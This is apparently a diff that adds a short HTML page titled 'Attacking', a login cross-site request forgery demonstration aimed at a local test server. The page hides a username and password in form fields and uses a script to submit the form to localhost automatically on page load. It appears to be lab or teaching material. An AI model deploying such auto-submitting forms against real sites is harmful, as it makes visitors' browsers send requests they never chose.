@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacking</title>
+</head>
+
+<body>
+    <form action="http://localhost:9898/login" method="POST">
+        <input type="hidden" name="username" value="kieran">
+        <input type="hidden" name="password" value="password">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+
+</body>
+
+</html>
